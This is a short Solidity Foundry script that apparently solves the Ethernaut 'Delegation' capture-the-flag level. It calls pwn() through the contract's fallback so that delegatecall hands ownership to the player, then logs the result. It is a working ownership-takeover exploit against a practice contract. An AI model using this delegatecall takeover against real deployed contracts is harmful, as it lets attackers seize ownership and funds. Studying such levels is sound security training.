// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x3c63AbF6131E66Bfca45d936a8f9635E8d3B5431);

    function run() external {

        address player = vm.envAddress("MY_ADDRESS");
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
        console.log(delegationInstance.owner() == player);
    }
}